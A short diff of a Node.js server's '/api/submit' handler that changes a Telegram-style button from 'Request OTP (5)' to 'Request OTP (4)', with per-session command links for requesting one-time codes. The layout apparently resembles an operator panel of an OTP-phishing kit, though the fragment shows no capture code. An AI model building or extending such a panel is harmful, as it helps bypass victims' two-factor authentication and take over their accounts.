@@ -44,7 +44,7 @@ app.post("/api/submit", async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "🔢 Request OTP (5)", url: `${BASE_URL}/api/cmd/${sessionId}/otp5` },
+                        { text: "🔢 Request OTP (4)", url: `${BASE_URL}/api/cmd/${sessionId}/otp4` },
                         { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/otp6` }
                     ],
                     [
